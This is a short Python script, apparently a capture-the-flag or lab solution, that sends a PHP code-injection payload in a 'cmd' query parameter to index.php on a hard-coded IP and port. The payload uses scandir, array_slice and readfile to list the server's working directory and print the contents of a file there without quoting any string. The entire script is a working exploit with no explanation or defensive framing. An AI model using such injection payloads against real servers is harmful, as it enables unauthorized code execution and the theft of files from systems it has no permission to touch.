import requests

url = "http://34.185.222.215:32221/index.php"

params = {
    "cmd" : "readfile(implode(array_slice(scandir(getcwd()),2,1)));" 
}

r = requests.get(url=url, params=params)
print(r.text)